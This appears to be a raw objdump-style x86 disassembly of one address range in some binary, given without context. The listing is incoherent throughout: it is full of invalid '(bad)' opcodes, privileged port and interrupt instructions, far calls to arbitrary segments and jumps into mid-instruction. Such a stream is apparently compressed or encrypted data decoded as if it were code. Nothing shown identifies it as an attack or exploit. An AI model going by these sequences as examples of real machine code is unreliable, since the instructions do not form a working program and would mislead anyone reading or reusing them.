  413ec2:	sub    al,0xaf
  413ec4:	jl     0x413ee3
  413ec6:	xor    DWORD PTR [edi+0x3c],edi
  413ec9:	loop   0x413f05
  413ecb:	mov    ebp,0xe7d5cc17
  413ed0:	outs   dx,BYTE PTR ds:[esi]
  413ed1:	add    DWORD PTR [ebx-0x66f8dcba],0xffffffb1
  413ed8:	sub    eax,0x7a80dd24
  413edd:	ins    DWORD PTR es:[edi],dx
  413ede:	rcl    dl,1
  413ee0:	sub    DWORD PTR [esi],0xffffffc0
  413ee3:	shr    BYTE PTR [ecx+0x114f5532],0x3f
  413eea:	xlat   BYTE PTR ds:[ebx]
  413eeb:	inc    esi
  413eec:	add    ecx,DWORD PTR [ebx+0x6fb6bbd3]
  413ef2:	sub    eax,DWORD PTR [ebx]
  413ef4:	dec    ecx
  413ef5:	call   0xddba:0x849e4189
  413efc:	call   0x7233abb1
  413f01:	xchg   edi,eax
  413f02:	out    dx,al
  413f03:	cdq    
  413f04:	push   ss
  413f05:	pop    esp
  413f06:	sub    al,0x92
  413f08:	fld    DWORD PTR [esi]
  413f0a:	mov    edi,0xb4de96b8
  413f0f:	push   ebx
  413f10:	sbb    al,0x2b
  413f12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f13:	jmp    ebx
  413f15:	je     0x413eef
  413f17:	and    DWORD PTR es:[edi+esi*1],ebx
  413f1b:	fnsave [edx+0x1a]
  413f1e:	out    dx,eax
  413f1f:	sbb    eax,0x764e063
  413f24:	loope  0x413f67
  413f26:	rcl    DWORD PTR [ecx-0x3f],1
  413f29:	mov    dl,0xd0
  413f2b:	push   ebx
  413f2c:	imul   edx,DWORD PTR [eax],0x3430f960
  413f32:	fs push ecx
  413f34:	sub    ecx,DWORD PTR ds:0xc348d2ec
  413f3a:	je     0x413f0f
  413f3c:	mov    ds:0x40486f59,al
  413f41:	fadd   DWORD PTR [ecx+ecx*8]
  413f44:	xchg   esi,eax
  413f45:	aam    0x7
  413f47:	fsub   st(5),st
  413f49:	xchg   edx,eax
  413f4a:	mov    al,0xd2
  413f4c:	jns    0x413edd
  413f4e:	popa   
  413f4f:	push   esi
  413f50:	inc    edx
  413f51:	push   ecx
  413f52:	mov    ds:0x99468ed,eax
  413f57:	xchg   ebx,eax
  413f58:	loopne 0x413f52
  413f5a:	cmp    al,0x72
  413f5c:	stos   DWORD PTR es:[edi],eax
  413f5d:	repnz (bad) 
  413f5f:	jl     0x413ef9
  413f61:	sub    BYTE PTR [ecx-0x3c],dl
  413f64:	xchg   BYTE PTR [ecx+ebp*4+0x7f9e13d9],ah
  413f6b:	cmp    dh,bh
  413f6d:	dec    ebp
  413f6e:	(bad)  
  413f6f:	popa   
  413f70:	icebp  
  413f71:	(bad)  
  413f72:	or     eax,ebp
  413f74:	int3   
  413f75:	xchg   DWORD PTR [ebx-0x52f35e72],edi
  413f7b:	xchg   ebp,eax
  413f7c:	loopne 0x413f39
  413f7e:	mov    esi,0x8cfec056
  413f83:	mov    ebp,0x7fce37b7
  413f88:	loope  0x413ff1
  413f8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f8b:	das    
  413f8c:	inc    ebx
  413f8d:	cmp    BYTE PTR [eax+ebp*4-0x1],al
  413f91:	daa    
  413f92:	sbb    BYTE PTR [eax+0x4c191262],bl
  413f98:	push   edx
  413f99:	lods   eax,DWORD PTR ds:[esi]
  413f9a:	int3   
  413f9b:	pop    ecx
  413f9c:	psrad  mm0,QWORD PTR [ecx+0x1a]
  413fa0:	not    BYTE PTR [eax+0xc17e812]
  413fa6:	repz loope 0x413f72
  413fa9:	or     BYTE PTR [ebx-0x76],dl
  413fac:	lock inc ebp
  413fae:	inc    eax
  413faf:	jno    0x413f5f
  413fb1:	loop   0x414015
  413fb3:	(bad)  
  413fb4:	call   DWORD PTR [edx]
  413fb6:	inc    ecx
  413fb7:	jo     0x413f6e
  413fb9:	rcr    BYTE PTR [esi],cl
  413fbb:	xchg   BYTE PTR [edx+0x0],dh
  413fbe:	js     0x413f91
  413fc0:	es jne 0x413fdf
  413fc3:	pop    esp
  413fc4:	dec    ecx
  413fc5:	cmp    eax,0x7c9247ae
  413fca:	iret   
  413fcb:	ds popa 
  413fcd:	pop    esp
  413fce:	in     al,dx
  413fcf:	xchg   BYTE PTR [esi-0x77],cl
  413fd2:	xchg   ebp,eax
  413fd3:	sub    BYTE PTR [edx+0xe90ea39],cl
  413fd9:	fldenv [esp+0x72c08360]
  413fe0:	fistp  QWORD PTR [eax+0x7c163c5f]
  413fe6:	xchg   esi,eax
  413fe7:	mov    al,0xf6
  413fe9:	and    bl,BYTE PTR [edx-0x25]
  413fec:	add    BYTE PTR [ebp+0x242306c2],ch
  413ff2:	mov    ecx,0xa32341a0
  413ff7:	inc    esp
  413ff8:	es adc ch,ah
  413ffb:	addr16 cwde 
  413ffd:	fbld   TBYTE PTR [esi]
  413fff:	and    eax,0xadfe898
  414004:	push   edx
  414005:	pusha  
  414006:	jle    0x414059
  414008:	call   0xedd783e3
  41400d:	inc    esi
  41400e:	mov    eax,ds:0x6dcca9c8
  414013:	je     0x413fb6
  414015:	mov    ebp,0xe5bfdae0
  41401a:	inc    BYTE PTR [ecx]
  41401c:	es cmp cl,al
  41401f:	xchg   ecx,eax
  414020:	scas   al,BYTE PTR es:[edi]
  414021:	sbb    esp,0x4ac5c401
  414027:	inc    edi
  414028:	xchg   edi,eax
  414029:	aas    
  41402a:	mov    cl,0x50
  41402c:	psraw  mm0,QWORD PTR [edi]
  41402f:	popf   
  414030:	or     al,0x53
  414032:	fadd   DWORD PTR [edx+0x3b656f23]
  414038:	repz loopne 0x4140b0
  41403b:	int    0x1e
  41403d:	or     esi,DWORD PTR [esi-0x98de6c4]
  414043:	(bad)  
  414044:	mov    gs,edx
  414046:	test   al,0x47
  414048:	jg     0x414086
  41404a:	imul   dh
  41404c:	out    0x18,eax
  41404e:	pop    ds
  41404f:	push   cs
  414050:	and    dx,WORD PTR [ecx+0x3]
  414054:	adc    al,0x96
  414056:	jecxz  0x414094
  414058:	or     DWORD PTR ds:0x124caa22,0xffffffc5
  41405f:	je     0x414092
  414061:	sbb    dl,BYTE PTR [edx-0x5f]
  414064:	shl    BYTE PTR [esi],cl
  414066:	push   es
  414067:	shr    DWORD PTR [ebp+0x1d],1
  41406a:	dec    ecx
  41406b:	push   ecx
  41406c:	mov    eax,ds:0x7b9a3fc1
  414071:	es (bad) 
  414073:	aas    
  414074:	in     eax,dx
  414075:	mov    edx,0x2090709e
  41407a:	ret    
  41407b:	enter  0x8169,0x10
  41407f:	mov    bh,0x8f
  414081:	imul   edi,DWORD PTR [esi+0x3b52995e],0xbab9abed
  41408b:	adc    ch,0x52
  41408e:	pop    esi
  41408f:	add    ecx,ecx
  414091:	xchg   edx,eax
  414092:	push   0xf508d181
  414097:	inc    eax
  414098:	mov    al,ds:0xd8b04346
  41409d:	nop
  41409e:	cmp    eax,0x9e9fa33f
  4140a3:	ficomp WORD PTR [eax]
  4140a5:	loope  0x414035
  4140a7:	out    0x51,al
  4140a9:	(bad)  
  4140aa:	int3   
  4140ab:	and    ebx,DWORD PTR [eax-0x1b]
  4140ae:	sub    edi,DWORD PTR [ebx+0x2]
  4140b1:	sub    DWORD PTR [ecx+eiz*8+0x1cc7d1b8],esi
  4140b8:	in     al,dx
  4140b9:	sub    ah,BYTE PTR [edx+0x14322579]
  4140bf:	dec    ebp
  4140c0:	inc    esi
  4140c1:	mov    bh,0x2e
  4140c3:	ds jne 0x414134
  4140c6:	sub    esi,DWORD PTR [ecx-0x25912dc0]
  4140cc:	test   al,0x9c
  4140ce:	push   es
  4140cf:	scas   al,BYTE PTR es:[edi]
  4140d0:	cmp    ax,0xcbef
  4140d4:	xchg   ebp,eax
  4140d5:	test   al,0xa1
  4140d7:	pushf  
  4140d8:	aas    
  4140d9:	jb     0x414096
  4140db:	push   ss
  4140dc:	aas    
  4140dd:	or     BYTE PTR [eax-0x6e558f2c],dh
  4140e3:	enter  0x7680,0xc9
  4140e7:	and    esi,DWORD PTR [ebp-0x3be93dff]
  4140ed:	scas   al,BYTE PTR es:[edi]
  4140ee:	mov    dh,0xc3
  4140f0:	mov    bl,0x21
  4140f2:	fs int3 
  4140f4:	mov    ss,ecx
  4140f6:	push   0x4b
  4140f8:	mov    ebp,0x8164de25
  4140fd:	or     BYTE PTR [ecx],0x1a
  414100:	push   edi
  414101:	sub    DWORD PTR [edx],esi
  414103:	xchg   esp,eax
  414104:	adc    ebp,DWORD PTR [edi+0x3f]
  414107:	sub    al,0xc5
  414109:	push   eax
  41410a:	push   edi
  41410b:	int3   
  41410c:	ss int3 
  41410e:	(bad)  
  41410f:	cmp    al,dh
  414111:	inc    eax
  414112:	pop    ecx
  414113:	pushf  
  414114:	mov    bl,0xca
  414116:	in     eax,dx
  414117:	xor    DWORD PTR [edi-0x55],eax
  41411a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41411b:	cs fldl2e 
  41411e:	dec    esi
  41411f:	mov    cl,0x3f
  414121:	and    DWORD PTR [esi],ecx
  414123:	sahf   
  414124:	fisub  DWORD PTR [ebp+0x9239f12]
  41412a:	or     BYTE PTR [esp+edi*2+0x9],cl
  41412e:	pusha  
  41412f:	ror    ecx,0xe1
  414132:	mov    esp,0x5da30c8a
  414137:	push   edx
  414138:	dec    eax
  414139:	sbb    dl,BYTE PTR [esi]
  41413b:	vpcomuw xmm4,xmm2,XMMWORD PTR [ecx-0x6a770e6a],0x9d
  414145:	inc    esp
  414146:	cld    
  414147:	pushf  
  414148:	(bad)  [edx+0x2aafd98d]
  41414e:	or     esi,DWORD PTR [ecx]
  414150:	mov    ds:0x643ad2ba,eax
  414155:	es push ss
  414157:	adc    cl,bh
  414159:	lahf   
  41415a:	mov    eax,0x2057c04
  41415f:	cmc    
  414160:	xchg   ebx,eax
  414161:	imul   esp,DWORD PTR [ebx+0x747e19da],0x2dbf4931
  41416b:	dec    ebx
  41416c:	outs   dx,DWORD PTR ds:[esi]
  41416d:	jp     0x4141b5
  41416f:	jnp    0x4141d4
  414171:	aam    0xd7
  414173:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414174:	xor    al,0x66
  414176:	jle    0x41416f
  414178:	sbb    al,0xe7
  41417a:	sbb    ah,BYTE PTR [esi]
  41417c:	stc    
  41417d:	fdiv   DWORD PTR [ebx]
  41417f:	shr    ebp,cl
  414181:	sbb    BYTE PTR ds:0x7eadeea0,0x6e
  414188:	stos   DWORD PTR es:[edi],eax
  414189:	in     al,0x23
  41418b:	fsubr  DWORD PTR [eax-0x7caff1b8]
  414191:	dec    ebx
  414192:	mov    al,0xf9
  414194:	adc    eax,ecx
  414196:	pop    esi
  414197:	mov    ch,0x6e
  414199:	out    0xe,eax
  41419b:	sub    ah,BYTE PTR [esi+0x3bc4f1d9]
  4141a1:	jbe    0x414149
  4141a3:	and    dh,cl
  4141a5:	sub    edx,DWORD PTR [ecx+eiz*8-0x2]
  4141a9:	iret   
  4141aa:	jae    0x4141b5
  4141ac:	and    al,BYTE PTR [eax-0x30]
  4141af:	cmp    BYTE PTR [esp+eax*2+0x10],dh
  4141b3:	add    al,0xca
  4141b5:	fstp   QWORD PTR [esi-0x2c6569c4]
  4141bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141bd:	xchg   edx,eax
  4141be:	jl     0x4141b9
  4141c0:	lods   al,BYTE PTR ds:[esi]
  4141c1:	jl     0x4141eb
  4141c3:	and    DWORD PTR [esi+eiz*8+0x66],eax
  4141c7:	sub    ebp,DWORD PTR [ebp+edi*4-0x57]
  4141cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141cc:	(bad)  
  4141cd:	jns    0x4141d7
  4141cf:	test   eax,0x561cc65c
  4141d4:	sar    ah,1
  4141d6:	cld    
  4141d7:	jnp    0x414244
  4141d9:	fidivr DWORD PTR [ecx+ecx*8]
  4141dc:	xchg   edx,eax
  4141dd:	and    al,0x4e
  4141df:	xor    DWORD PTR [esi],edi
  4141e1:	sbb    dl,BYTE PTR [ebx+0x57c828bb]
  4141e7:	add    al,al
  4141e9:	popa   
  4141ea:	iret   
  4141eb:	jl     0x414265
  4141ed:	or     ah,bl
  4141ef:	jl     0x414190
  4141f1:	sub    cl,BYTE PTR [ebp-0x37feba64]
  4141f7:	(bad)  
  4141f8:	push   ss
  4141f9:	aad    0x6f
  4141fb:	rcl    DWORD PTR [edi-0x70],1
  4141fe:	jne    0x414180
  414200:	loopne 0x41418c
  414202:	jb     0x4141b5
  414204:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414205:	push   ds
  414206:	ror    BYTE PTR [edi-0x41],0xd3
  41420a:	(bad)  
  41420b:	sbb    eax,0x9e3abeca
  414210:	mov    fs,WORD PTR [ebp-0x51]
  414213:	mov    bh,bh
  414215:	push   ebp
  414216:	sub    eax,0xf3f078cf
  41421b:	push   cs
  41421c:	icebp  
  41421d:	retf   0x52b8
  414220:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414221:	xor    al,0xf0
  414223:	or     BYTE PTR [ebx+0x37f98b31],bh
  414229:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41422a:	mov    cs,WORD PTR [ebx+0xf]
  41422d:	sub    al,0xf5
  41422f:	pop    ebp
  414230:	sbb    BYTE PTR [esi-0x5982cbb5],al
  414236:	ror    BYTE PTR [esi-0x2d],1
  414239:	push   edx
  41423a:	adc    eax,0xd7f6162a
  41423f:	adc    al,BYTE PTR ds:0x64d94919
  414245:	inc    ebp
  414246:	xchg   DWORD PTR [edi-0xa],ecx
  414249:	mov    esi,0x546b6909
  41424e:	outs   dx,BYTE PTR ds:[esi]
  41424f:	icebp  
  414250:	jae    0x414228
  414252:	jns    0x41424d
  414254:	and    DWORD PTR [edx-0x55bae9de],ebp
  41425a:	out    0x5b,al
  41425c:	push   cs
  41425d:	mov    cs,esp
  41425f:	cli    
  414260:	add    al,0x31
  414262:	mov    bl,0x41
  414264:	sbb    ch,ch
  414266:	xchg   esp,eax
  414267:	fisttp DWORD PTR [edx]
  414269:	cmp    al,0xa7
  41426b:	test   al,0x2b
  41426d:	xlat   BYTE PTR ds:[ebx]
  41426e:	mov    al,BYTE PTR [ecx+0x5872f80a]
  414274:	test   eax,0xd6003d8
  414279:	sbb    DWORD PTR [eax-0x44],ebx
  41427c:	xchg   ecx,eax
  41427d:	mov    edx,0x88902120
  414282:	sub    DWORD PTR [edx+esi*2+0x3c],0x40e06661
  41428a:	xor    DWORD PTR [edi],0x4d7dd94c
  414290:	rcr    dh,0x81
  414293:	mov    WORD PTR [ebx+0x5f927e17],?
  414299:	mov    edi,0x90eb8990
  41429e:	fiadd  WORD PTR [ebp-0x1b]
  4142a1:	inc    edx
  4142a2:	mov    esi,0x3a484fc1
  4142a7:	rol    BYTE PTR [ebx+eax*1-0xf1d843d],0xc5
  4142af:	or     eax,0xbed72dd2
  4142b4:	adc    BYTE PTR [ebx-0x28317fe0],al
  4142ba:	xchg   ebx,eax
  4142bb:	call   0x86bf:0x4bf97e23
  4142c2:	loopne 0x414325
  4142c4:	ins    BYTE PTR es:[edi],dx
  4142c5:	ret    0xbdfb
  4142c8:	pop    ecx
  4142c9:	or     al,BYTE PTR [edi+0x19]
  4142cc:	test   eax,0x885f19d8
  4142d1:	daa    
  4142d2:	fldenv ss:[ebx]
  4142d5:	adc    esp,edx
  4142d7:	push   cs
  4142d8:	xchg   esp,eax
  4142d9:	xchg   ecx,eax
  4142da:	mov    ds:0xe785b4a2,al
  4142df:	pop    ebx
  4142e0:	add    BYTE PTR [esi-0x11683b66],dh
  4142e6:	mov    DWORD PTR [ebx-0x70],edi
  4142e9:	cld    
  4142ea:	pusha  
  4142eb:	es inc esi
  4142ed:	mov    esp,0xccb00e1f
  4142f2:	mov    ebx,DWORD PTR [ecx]
  4142f4:	adc    esi,DWORD PTR [ecx]
  4142f6:	int    0xdb
  4142f8:	mov    dh,0x27
  4142fa:	sub    ch,al
  4142fc:	dec    edi
  4142fd:	pushf  
  4142fe:	leave  
  4142ff:	sbb    BYTE PTR [edx],ah
  414301:	push   ecx
  414302:	xchg   esp,eax
  414303:	dec    esp
  414304:	popf   
  414305:	lahf   
  414306:	xor    ecx,esp
  414308:	test   BYTE PTR [ebx+0x700e0eb9],dh
  41430e:	push   edx
  41430f:	ret    0x1cc0
  414312:	fcmove st,st(5)
  414314:	cmp    ebx,DWORD PTR ds:0xc9a08dc2
  41431a:	ins    BYTE PTR es:[edi],dx
  41431b:	push   ebx
  41431c:	jge    0x4142a9
  41431e:	imul   edx,DWORD PTR [eax+ebx*1-0x61],0x69576d10
  414326:	call   FWORD PTR [eax+eiz*2]
  414329:	push   edx
  41432a:	repnz push esi
  41432c:	jns    0x41434d
  41432e:	xor    BYTE PTR [eax+0x3f],al
  414331:	sti    
  414332:	dec    esi
  414333:	inc    ebx
  414334:	inc    esp
  414335:	fild   QWORD PTR [edx+eax*8+0x5564e165]
  41433c:	pusha  
  41433d:	xor    BYTE PTR [ebp+ebp*8+0x53],0x3e
  414342:	inc    esp
  414343:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414344:	repz or al,0xa7
  414347:	sbb    al,0x32
  414349:	jl     0x414313
  41434b:	mov    ecx,0x5d71ea9
  414350:	pop    DWORD PTR [ebx]
  414352:	dec    esi
  414353:	or     eax,0x542c35fe
  414358:	push   eax
  414359:	shl    cl,cl
  41435b:	lahf   
  41435c:	mov    ah,0xf1
  41435e:	inc    eax
  41435f:	and    al,0x89
  414361:	mov    al,0x51
  414363:	repz popf 
  414365:	pop    es
  414366:	pushf  
  414367:	mov    ds:0xb135ebd3,al
  41436c:	xor    BYTE PTR [esi],dl
  41436e:	(bad)  
  41436f:	and    bh,BYTE PTR [ebp+0x42]
  414372:	or     DWORD PTR [ebx+0x34],ebx
  414375:	xchg   edx,eax
  414376:	jno    0x41432e
  414378:	cbw    
  41437a:	fnsave [ebx-0x1]
  41437d:	pop    esi
  41437e:	dec    edx
  41437f:	outs   dx,DWORD PTR ds:[esi]
  414380:	push   cs
  414381:	inc    ecx
  414382:	outs   dx,BYTE PTR ds:[esi]
  414383:	cdq    
  414384:	aas    
  414385:	push   edi
  414386:	rcr    BYTE PTR [esi-0x1f457f87],0xb3
  41438d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41438e:	je     0x414338
  414390:	sbb    al,0x1b
  414392:	pop    ecx
  414393:	sbb    al,0xaa
  414395:	jbe    0x4143a7
  414397:	ror    edx,1
  414399:	sbb    eax,0x46125aa8
  41439e:	jne    0x4143c0
  4143a0:	jge    0x414342
  4143a2:	sbb    BYTE PTR [edx+0x65],al
  4143a5:	mov    ds:0x44426446,eax
  4143aa:	inc    ebp
  4143ab:	les    edi,FWORD PTR [eax+0x59]
  4143ae:	fwait
  4143af:	sbb    al,0xb2
  4143b1:	sub    al,0x82
  4143b3:	lds    esp,FWORD PTR [edx-0x3015e890]
  4143b9:	and    BYTE PTR [ebx+0x26],0x49
  4143bd:	lods   eax,DWORD PTR ds:[esi]
  4143be:	xlat   BYTE PTR ds:[ebx]
  4143bf:	out    0x8b,eax
  4143c1:	jg     0x414422
  4143c3:	xlat   BYTE PTR ds:[ebx]
  4143c4:	and    esp,DWORD PTR [ebx-0x29]
  4143c7:	clc    
  4143c8:	and    BYTE PTR [edi-0x34],dh
  4143cb:	rcl    BYTE PTR [eax+0x1628e164],1
  4143d1:	add    eax,0x6c9f4f2d
  4143d6:	inc    edx
  4143d7:	mov    edi,0x618168be
  4143dc:	shr    DWORD PTR [esi+0x40d78bb2],0xd3
  4143e3:	jp     0x41436d
  4143e5:	xlat   BYTE PTR ds:[ebx]
  4143e6:	movnti DWORD PTR [eax],esp
  4143e9:	popf   
  4143ea:	scas   al,BYTE PTR es:[edi]
  4143eb:	fild   DWORD PTR [edx-0x7e]
  4143ee:	out    dx,eax
  4143ef:	repnz fmul st,st(4)
  4143f2:	sbb    al,0xd
  4143f4:	push   0x6c
  4143f6:	dec    edi
  4143f7:	or     al,0x12
  4143f9:	push   ds
  4143fa:	hlt    
  4143fb:	les    ebx,FWORD PTR [ebx+ecx*2-0x9]
  4143ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414400:	imul   eax,DWORD PTR [ebp*4+0x2f79d165],0x3ab004c6
  41440b:	in     al,0x63
  41440d:	lea    edi,[edi+ecx*2]
  414410:	dec    BYTE PTR [ebx+0x4ba92225]
  414416:	int3   
  414417:	mov    ah,cl
  414419:	push   ds
  41441a:	sub    esp,ebp
  41441c:	outs   dx,DWORD PTR ds:[esi]
  41441d:	shr    DWORD PTR [edx],1
  41441f:	gs inc ebp
  414421:	fs push edx
  414423:	shr    BYTE PTR [esi-0x4dd3a28f],1
  414429:	inc    esp
  41442a:	cmp    dh,BYTE PTR [ebp+esi*8-0x34f88ba7]
  414431:	or     esp,DWORD PTR gs:[edx-0xa]
  414435:	ins    DWORD PTR es:[edi],dx
  414436:	loopne 0x41440f
  414438:	repz test al,0x37
  41443b:	(bad)  
  41443c:	cmp    dh,bl
  41443e:	ss mov esp,0xd29317b5
  414444:	push   ebp
  414445:	mov    esi,0x316b6346
  41444a:	sbb    ebx,DWORD PTR [ebp-0x136623e5]
  414450:	add    al,0x9b
  414452:	shl    DWORD PTR [edi],cl
  414454:	repnz push ebx
  414456:	leave  
  414457:	or     edx,DWORD PTR [ebp-0x731c5e60]
  41445d:	inc    ecx
  41445e:	fistp  DWORD PTR [ecx]
  414460:	dec    eax
  414461:	dec    eax
  414462:	jmp    0x414405
  414464:	xchg   edx,eax
  414465:	js     0x414477
  414467:	jbe    0x4144a9
  414469:	jo     0x4143f4
  41446b:	test   al,0xf5
  41446e:	imul   esi,DWORD PTR [edi+ebp*8-0x1bffa374],0x4e
  414476:	pop    edx
  414477:	inc    eax
  414478:	add    edx,DWORD PTR [esp+ebp*4+0xbb0f8f3]
  41447f:	aas    
  414480:	inc    ebx
  414481:	adc    BYTE PTR [ebx-0x1d0610e6],dl
  414487:	adc    ch,BYTE PTR [edi+edx*8+0x40ff643d]
  41448e:	push   esp
  41448f:	sbb    bl,BYTE PTR [edi-0x4d]
  414492:	stos   DWORD PTR es:[edi],eax
  414493:	or     eax,0xa803a28d
  414498:	dec    ebx
  414499:	ror    BYTE PTR [edi+0x3f8ad64f],1
  41449f:	imul   esi,DWORD PTR [eax+0x42],0xffffff9d
  4144a3:	call   0xef4c8934
  4144a8:	push   ss
  4144a9:	mov    ch,0x29
  4144ab:	or     BYTE PTR [esi+0x3d],al
  4144ae:	je     0x414431
  4144b0:	add    DWORD PTR [edx],0x68
  4144b3:	mov    ds:0x4934c8de,al
  4144b8:	xchg   DWORD PTR [ebx+eiz*4+0x29],esp
  4144bc:	enter  0x7c75,0x6c
  4144c0:	xor    BYTE PTR ds:0x9bb189c4,0x48
  4144c7:	popf   
  4144c8:	push   cs
  4144c9:	arpl   bp,cx
  4144cb:	(bad)  
  4144cc:	mov    al,BYTE PTR [edi-0x584cf396]
  4144d2:	test   BYTE PTR [esp+edx*8+0x5],ah
  4144d6:	sub    eax,0x3711c4c3
  4144db:	xor    dl,ch
  4144dd:	or     cl,BYTE PTR ds:[eax]
  4144e0:	lods   eax,DWORD PTR ds:[esi]
  4144e1:	retf   
  4144e2:	mov    esi,0x4db51814
  4144e7:	in     al,0xe5
  4144e9:	outs   dx,BYTE PTR ds:[esi]
  4144ea:	out    dx,al
  4144eb:	ins    DWORD PTR es:[edi],dx
  4144ec:	jno    0x4144f2
  4144ee:	pop    es
  4144ef:	add    eax,0x2a3de
  4144f4:	aad    0xf5
  4144f6:	xchg   edi,eax
  4144f7:	xchg   ebx,eax
  4144f8:	dec    eax
  4144f9:	dec    edi
  4144fa:	call   0xb6cbfa37
  4144ff:	popa   
  414500:	inc    edi
  414501:	out    0x27,eax
  414503:	sub    ebx,edx
  414505:	adc    DWORD PTR [ecx+0x6],esi
  414508:	inc    ebx
  414509:	dec    edx
  41450b:	inc    esi
  41450c:	shl    DWORD PTR [edi-0x234aaf04],1
  414512:	inc    ecx
  414513:	jmp    0xeb1a:0xb736466d
  41451a:	push   0xa36c54f
  41451f:	mov    ch,0x5c
  414521:	xchg   esp,eax
  414522:	xor    al,0xe7
  414524:	xor    DWORD PTR [esi+0x75],0xffffffbe
  414528:	and    BYTE PTR [ebx+edi*4-0x1],0x75
  41452d:	jmp    0x414567
  41452f:	jb     0x4144b1
  414531:	(bad)  
  414532:	mov    bl,0x1f
  414534:	dec    esp
  414535:	test   al,0xdd
  414537:	out    0x99,al
  414539:	mov    eax,0xc0feecba
  41453e:	sbb    eax,DWORD PTR [eax-0x69]
  414541:	leave  
  414542:	lods   eax,DWORD PTR ds:[esi]
  414543:	ins    BYTE PTR es:[edi],dx
  414544:	xor    BYTE PTR [ecx],dl
  414546:	push   cs
  414547:	ins    DWORD PTR es:[edi],dx
  414548:	stos   BYTE PTR es:[edi],al
  414549:	adc    BYTE PTR [ebx+ebp*1],al
  41454c:	cwde   
  41454d:	popa   
  41454e:	clc    
  41454f:	sbb    eax,0xe2ffd56e
  414554:	bound  edx,QWORD PTR [ecx-0x28]
  414557:	inc    edx
  414558:	or     dh,BYTE PTR ds:0xb6eee645
  41455e:	push   es
  41455f:	bound  ebp,QWORD PTR [esp+esi*1]
  414562:	int3   
  414563:	pop    ecx
  414564:	mov    BYTE PTR [edi],dh
  414566:	or     esi,edx
  414568:	cs mov dh,0x6b
  41456b:	dec    ecx
  41456c:	mov    ah,0xb7
  41456e:	sub    BYTE PTR [edi],cl
  414570:	rcl    ebp,1
  414572:	push   ebp
  414573:	inc    eax
  414574:	dec    ebp
  414575:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414576:	mov    esp,0x9bb08f56
  41457b:	std    
  41457c:	inc    edx
  41457d:	daa    
  41457e:	mov    bh,BYTE PTR [edx-0x4e2e603e]
  414584:	in     al,0xf
  414586:	stos   DWORD PTR es:[edi],eax
  414587:	lds    edx,FWORD PTR [ebx]
  414589:	fcomp  DWORD PTR ss:[eax-0x24442da7]
  414590:	xor    DWORD PTR [edi-0x2f7451dc],ecx
  414596:	stos   BYTE PTR es:[edi],al
  414597:	enter  0x7cfd,0x5d
  41459b:	inc    ecx
  41459c:	sub    eax,edx
  41459e:	sti    
  41459f:	imul   BYTE PTR [eax+0x20555460]
  4145a5:	imul   esp,DWORD PTR [ecx-0x477ada9b],0x3b
  4145ac:	cmp    esp,esi
  4145ae:	nop
  4145af:	repnz push esi
  4145b1:	outs   dx,DWORD PTR ds:[si]
  4145b3:	jnp    0x4145df
  4145b5:	pushf  
  4145b6:	sbb    eax,0x9b3e9e1
  4145bb:	xchg   edi,eax
  4145bc:	push   0x70
  4145be:	mov    WORD PTR [eax+0x11],?
  4145c1:	sub    eax,0xcba33eab
  4145c6:	pop    es
  4145c7:	add    eax,0xf898bf8e
  4145cc:	(bad)  
  4145cd:	cld    
  4145ce:	scas   al,BYTE PTR es:[edi]
  4145cf:	scas   al,BYTE PTR es:[edi]
  4145d0:	cmp    ax,0xa277
  4145d4:	mov    eax,0x9d873f2a
  4145d9:	arpl   bp,si
  4145db:	mov    BYTE PTR [eax],0x1d
  4145de:	ror    bl,0x8a
  4145e1:	sti    
  4145e2:	xchg   ecx,eax
  4145e3:	leave  
  4145e4:	addr16 inc eax
  4145e6:	dec    ebx
  4145e7:	std    
  4145e8:	fsub   DWORD PTR [edi+0x649a6399]
  4145ee:	dec    ecx
  4145ef:	inc    esp
  4145f0:	inc    edi
  4145f1:	add    al,0x3d
  4145f3:	loope  0x41466c
  4145f5:	call   0x46f7:0x8e46f91b
  4145fc:	pop    esi
  4145fd:	test   ax,0x263c
  414601:	inc    eax
  414602:	sub    DWORD PTR [edi-0x45d93143],0xb0d95d98
  41460c:	pusha  
  41460d:	mov    dl,BYTE PTR [ebp+0x48]
  414610:	jg     0x8db57166
  414616:	hlt    
  414617:	retf   0xca91
  41461a:	retf   0x3703
  41461d:	out    0x27,eax
  41461f:	push   cs
  414620:	and    dh,dh
  414622:	and    BYTE PTR [edi],0xd4
  414625:	fstp   TBYTE PTR [ebx]
  414627:	or     BYTE PTR [eax+eax*1+0x7e011ad1],bh
  41462e:	ds (bad) 
  414630:	in     al,0x46
  414632:	push   0x43
  414634:	rol    DWORD PTR [edi+0x46571faf],1
  41463a:	iret   
  41463b:	js     0x4146ad
  41463d:	lea    esp,[ebx-0x6f5457b1]
  414643:	jecxz  0x41465c
  414645:	cdq    
  414646:	jns    0x41461c
  414648:	pop    es
  414649:	bound  ebx,QWORD PTR [eax]
  41464b:	jns    0x4146b1
  41464d:	cli    
  41464e:	pusha  
  41464f:	jl     0x4146a6
  414651:	pop    eax
  414652:	aam    0x92
  414654:	push   ebx
  414655:	sbb    bh,BYTE PTR [edx+0x6a7fb7d4]
  41465b:	hlt    
  41465c:	cli    
  41465d:	jnp    0x41460b
  41465f:	leave  
  414660:	push   ss
  414661:	mov    esp,0xc3fa4670
  414666:	adc    al,0x56
  414668:	retf   0xda01
  41466b:	inc    ebx
  41466c:	pop    eax
  41466d:	adc    ah,ch
  41466f:	aaa    
  414670:	fimul  DWORD PTR [ebx-0x33]
  414673:	std    
  414674:	jae    0x41461d
  414676:	jmp    0x2e43:0xdf519c4c
  41467d:	mov    bh,ch
  41467f:	fld    st(1)
  414681:	sub    ecx,DWORD PTR [eax]
  414683:	loope  0x4146c3
  414685:	bsr    ebx,DWORD PTR [edi+0x3d]
  414689:	mov    esi,0xe73695ba
  41468e:	lock mov esi,0x626f33e2
